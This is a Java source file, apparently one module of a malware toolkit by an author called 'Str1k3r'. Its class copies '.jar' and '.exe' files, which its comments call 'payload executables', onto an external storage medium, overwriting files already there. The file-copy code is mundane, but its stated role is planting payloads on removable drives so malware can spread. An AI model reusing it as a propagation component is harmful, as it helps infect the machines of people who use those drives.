package modules.core;

import java.io.File;
import java.io.IOException;
import java.nio.file.*;

/**
    Responsible for copying payload executables to external storage medium.
    @see MediaWriter
    @author Str1k3r
 */
public class Depositor implements Runnable {
    private final String[] extensions = {".jar", ".exe"};
    private File source;
    private File destination;

    /**
        Initialise state for copying of files. R
     */
    public Depositor(File src, File dst) {
        source = src;
        destination = dst;
    }

    /**
        Threaded copying.
     */
    @Override
    public void run() {
        crawl();
    }

    /**
        Traverse the contents of the source (directory) and copy to the destination (directory).
     */
    private void crawl() {
        if(source.exists() && destination.exists()) {
            if(!source.isDirectory() || !destination.isDirectory()) {
                System.err.println("[!] Depositor expected directories for src and dst.");
                return;
            }

            File[] listing = source.listFiles();
            if(listing == null) {
                System.out.printf("[i] Depositor source is empty [Src: %s].", source.getAbsolutePath());
                return;
            }

            for(File file : listing) {
                if(file.isDirectory()) {
                    continue;
                }

                boolean isBin = in(file.getName().substring(file.getName().indexOf(".")), extensions);
                if(isBin) {
                    boolean success = copy(file.getAbsolutePath(),
                            String.format("%s\\%s", destination.getAbsolutePath(), file.getName()));

                    System.out.printf("< %s > Depositing %s\n",
                            (success)?"SUCCESS":"FAIL", file.getName());
                }
            }
        }
    }

    /**
        Copy provided file to destination.
        @param file Path of file top copy.
        @param dst Path of destination file.

        @return Returns true if copying succeeded, false otherwise.
    */
    private boolean copy(String file, String dst) {
        try {
            Path fPath = Paths.get(file);
            Path dPath = Paths.get(dst);
            Files.copy(fPath, dPath, StandardCopyOption.REPLACE_EXISTING);
            return true;
        }
        catch (IOException ioEx) {
            return false;
        }
    }

    /**
        Search for provided string in provided list of string.
        @return Returns true if found, false otherwise.
     */
    private boolean in(String search, String[] list) {
        for(String item : list) {
            if(item.equals(search)) {
                return true;
            }
        }

        return false;
    }
}
